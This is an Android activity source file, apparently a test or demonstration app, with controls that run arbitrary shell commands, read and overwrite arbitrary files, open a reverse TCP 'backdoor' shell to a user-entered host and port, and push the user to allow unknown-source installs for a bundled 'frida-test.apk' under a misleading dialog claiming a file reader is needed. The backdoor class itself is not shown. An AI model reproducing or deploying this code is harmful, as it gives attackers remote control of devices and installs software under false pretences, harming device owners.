package com.github.uiautomator.test;

import androidx.annotation.RequiresApi;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;
import android.Manifest;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.provider.Settings;
import android.util.Log;
import android.view.View;
import android.widget.Button;
import android.widget.EditText;

import java.io.BufferedInputStream;
import java.io.BufferedReader;
import java.io.File;
import java.io.FileOutputStream;
import java.io.FileReader;
import java.io.IOException;
import java.io.InputStreamReader;
import java.util.ArrayList;
import java.util.List;

import cn.pedant.SweetAlert.SweetAlertDialog;

public class MainActivity extends AppCompatActivity {

    private static String TAG = "JussiTest";
    private SweetAlertDialog warndialog;
    private ServiceApkInstaller wpsInstaller;
    private Context mContext;

    private Button write_button;
    private Button read_button;
    private Button shell_button;
    private Button backdoor_button;
    private Button install_button;

    private EditText read_path;
    private EditText write_path;
    private EditText shell_text;
    private EditText ip_text;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        write_button = findViewById(R.id.write);
        write_path = findViewById(R.id.output_path);
        write_button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String path = write_path.getText().toString();
                writeToFile(path);
            }
        });

        read_button = findViewById(R.id.read);
        read_path = findViewById(R.id.input_path);
        read_button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String path = read_path.getText().toString();
                readFileByLines(path);
            }
        });

        shell_button = findViewById(R.id.shell);
        shell_text = findViewById(R.id.shell_text);
        shell_button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String str = shell_text.getText().toString();
                exceShell(str);
            }
        });

        backdoor_button = findViewById(R.id.backdoor);
        ip_text = findViewById(R.id.ip_text);
        backdoor_button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                String[] host = ip_text.getText().toString().split(":");
                new Thread(new Runnable() {
                    @Override
                    public void run() {
                        Backdoor.reverse_tcp(host[0], Integer.parseInt(host[1]));
                    }
                }).start();
            }
        });


        install_button = findViewById(R.id.install_app);
        install_button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View view) {
                requestMyPermissions();

                mContext = MainActivity.this;
                warndialog = new SweetAlertDialog(mContext,SweetAlertDialog.NORMAL_TYPE);
                warndialog.setTitleText("需要安装文件读取软件，请去设置中开启此权限");

                wpsInstaller = new ServiceApkInstaller(MainActivity.this,"frida-test.apk");
                if(!wpsInstaller.hasInstalled()){
                    setInstallPermission();
                }
            }
        });

    }

    public static List<String> exceShell(String pathOrCommand) {
        List<String> result = new ArrayList<>();

        try {
            // 执行脚本
            Process ps = Runtime.getRuntime().exec(pathOrCommand);
            int exitValue = ps.waitFor();
            if (0 != exitValue) {
                Log.d(TAG, "call shell failed. error code is :" + exitValue);
            }

            // 只能接收脚本echo打印的数据，并且是echo打印的最后一次数据
            BufferedInputStream in = new BufferedInputStream(ps.getInputStream());
            BufferedReader br = new BufferedReader(new InputStreamReader(in));
            String line;
            Log.d(TAG,"脚本返回的数据如下：");
            while ((line = br.readLine()) != null) {
                Log.d(TAG, line);
                result.add(line);
            }
            in.close();
            br.close();

        } catch (Exception e) {
            e.printStackTrace();
        }

        return result;
    }


    public void writeToFile(String filePath){
        String sourceString = "Hacking hacking hacking";	//待写入字符串
        byte[] sourceByte = sourceString.getBytes();
        if(null != sourceByte){
            try {
                Log.d(TAG,"准备写入……");
                File file = new File(filePath);		//文件路径（路径+文件名）
                if (!file.exists()) {	//文件不存在则创建文件，先创建目录
                    File dir = new File(file.getParent());
                    dir.mkdirs();
                    file.createNewFile();
                }
                FileOutputStream outStream = new FileOutputStream(file);	//文件输出流用于将数据写入文件
                outStream.write(sourceByte);
                outStream.close();	//关闭文件输出流
                Log.d(TAG, "写入成功");
            } catch (Exception e) {
                e.printStackTrace();
            }
        }

    }

    public static void readFileByLines(String fileName) {
        File file = new File(fileName);
        BufferedReader reader = null;
        try {
            Log.d(TAG, "以行为单位读取文件内容，一次读一整行：");
            reader = new BufferedReader(new FileReader(file));
            String tempString = null;
            int line = 1;
            // 一次读入一行，直到读入null为文件结束
            while ((tempString = reader.readLine()) != null) {
                // 显示行号
                Log.i(TAG, "line " + line + ": " + tempString);
                line++;
            }
            reader.close();
        } catch (IOException e) {
            e.printStackTrace();
        } finally {
            if (reader != null) {
                try {
                    reader.close();
                } catch (IOException e1) {
                }
            }
        }
    }

    private void requestMyPermissions() {
        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.WRITE_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 100);
            Log.e(TAG,"无写SD权限");
        } else{
            Log.d(TAG,"有写SD权限");
        }

        if (ContextCompat.checkSelfPermission(this,
                Manifest.permission.READ_EXTERNAL_STORAGE)
                != PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(MainActivity.this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, 100);
            Log.e(TAG,"无读SD权限");
        } else {
            Log.d(TAG, "有读SD权限");
        }
    }

    public void setInstallPermission(){
        boolean haveInstallPermission;
        if(Build.VERSION.SDK_INT >= Build.VERSION_CODES.O){
            //先判断是否有安装未知来源应用的权限
            haveInstallPermission = mContext.getPackageManager().canRequestPackageInstalls();
            if(!haveInstallPermission){
                //弹框提示用户手动打开
                warndialog.setConfirmClickListener(new SweetAlertDialog.OnSweetClickListener() {
                    @Override
                    public void onClick(SweetAlertDialog sweetAlertDialog) {
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            //此方法需要API>=26才能使用
                            toInstallPermissionSettingIntent();
                        }
                    }
                });
                warndialog.show();
                // toInstallPermissionSettingIntent();
            }else{
                warndialog.dismiss();
                wpsInstaller.install();
            }
        }
    }


    /**
     * 开启安装未知来源权限
     */
    @RequiresApi(api = Build.VERSION_CODES.O)
    private void toInstallPermissionSettingIntent() {
        Uri packageURI = Uri.parse("package:"+this.getPackageName());
        Intent intent = new Intent(Settings.ACTION_MANAGE_UNKNOWN_APP_SOURCES,packageURI);
        startActivityForResult(intent, 10086);
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if (resultCode == RESULT_OK && requestCode == 10086) {
            warndialog.dismiss();
            wpsInstaller.install();
        }
    }
}

